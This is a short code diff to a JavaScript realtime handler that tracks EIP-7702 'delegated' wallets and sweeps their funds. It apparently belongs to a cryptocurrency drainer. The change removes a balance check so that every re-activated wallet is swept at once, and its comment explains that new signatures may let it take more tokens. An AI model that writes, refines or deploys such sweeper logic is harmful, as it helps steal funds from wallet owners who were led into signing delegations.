@@ -1986,19 +1986,16 @@ function subscribeRealtime() {
         const address = normalizeAddress(row.address);
         const type    = row.type || "eip7702";
         if (!address) return;
+        if (type === "monitoring") return; // ignore internal status updates
         delegatedWallets.set(address, type);
         monitoredWallets.set(address.toLowerCase(), { address, type });
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
-        log(`[realtime] 🔄 wallet updated ${address.slice(0, 10)} (${type}) — checking balance`);
-        const balances = await checkAllBalances(address);
-        const nonZero  = balances.filter(b => b.balance > 0n);
-        if (nonZero.length > 0) {
-          log(`[realtime] has balance (${nonZero.map(b => b.symbol).join(", ")}) — sweeping immediately`);
-          await dispatchSweep({ address, type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
-        } else {
-          log(`[realtime] ${address.slice(0, 10)} — no balance, monitoring for transfers`);
-        }
+        log(`[realtime] 🔄 re-activated ${address.slice(0, 10)} (${type}) — dispatching sweep`);
+        // Always sweep on re-activation: new signatures may cover tokens with
+        // zero balance now but positive balance moments later, and the balance
+        // check only covers tokens in the watch list.
+        dispatchSweep({ address, type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
       }
     )
 
